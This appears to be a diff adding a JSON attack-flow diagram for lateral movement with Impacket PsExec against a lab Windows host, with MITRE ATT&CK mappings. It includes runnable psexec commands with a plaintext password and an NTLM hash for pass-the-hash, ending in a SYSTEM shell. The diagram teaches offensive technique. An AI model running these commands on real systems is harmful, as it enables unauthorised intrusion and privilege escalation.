@@ -1,0 +1,111 @@
+{
+  "title": "Shell via Impacket PsExec",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Operations",
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "impacket_tool"
+      ],
+      "position": {
+        "x": -154.06253267802992,
+        "y": 50.390829237686916
+      }
+    },
+    {
+      "id": "impacket_tool",
+      "label": "impacket-psexec",
+      "icon": "IconTerminal",
+      "type": "node",
+      "position": {
+        "x": -154.06253267802992,
+        "y": 37.890829237686916
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "icon": "IconNetwork",
+      "type": "container",
+      "members": [
+        "target_machine"
+      ],
+      "position": {
+        "x": 271.35836034717147,
+        "y": -157.83880581407504
+      }
+    },
+    {
+      "id": "target_machine",
+      "label": "Target Host (10.0.2.73)",
+      "icon": "IconWindows",
+      "type": "node",
+      "position": {
+        "x": 255.32782599602643,
+        "y": -57.36170657743377
+      }
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "Launch PsExec Client",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "impacket_tool",
+      "description": "The attacker starts the Impacket PsExec client with valid credentials or an NTLM hash for the target host.",
+      "cli": "impacket-psexec 'MARVEL/fcastle:Password1@10.0.2.73'\nimpacket-psexec -hashes :c39f2beb3d2ec06a62cb887fb391dee0 MARVEL/fcastle@10.0.2.73"
+    },
+    {
+      "id": 2,
+      "name": "Establish Remote Admin Channel",
+      "mitre": {
+        "id": "T1021.002",
+        "tactic": "Lateral Movement",
+        "technique": "SMB/Windows Admin Shares"
+      },
+      "type": "edge",
+      "from": "impacket_tool",
+      "to": "corporate_network",
+      "description": "The tool authenticates over SMB and reaches the remote administrative channel needed for admin-share access and service management."
+    },
+    {
+      "id": 3,
+      "name": "Stage and Start Service Payload",
+      "mitre": {
+        "id": "T1569.002",
+        "tactic": "Execution",
+        "technique": "System Services: Service Execution"
+      },
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "target_machine",
+      "description": "A service payload is written to ADMIN$ and started remotely through the Service Control Manager on the target Windows host."
+    },
+    {
+      "id": 4,
+      "name": "Return SYSTEM Shell",
+      "type": "edge",
+      "from": "target_machine",
+      "to": "impacket_tool",
+      "description": "The service executes under a privileged context and returns an interactive shell channel to the attacker."
+    }
+  ],
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false,
+  "viewport": {
+    "zoom": 1.31,
+    "pan": {
+      "x": 583,
+      "y": 354
+    }
+  },
+  "stepInfoPosition": {
+    "x": 798.5,
+    "y": 702.75
+  },
+  "edgeCurveScale": 100
+}
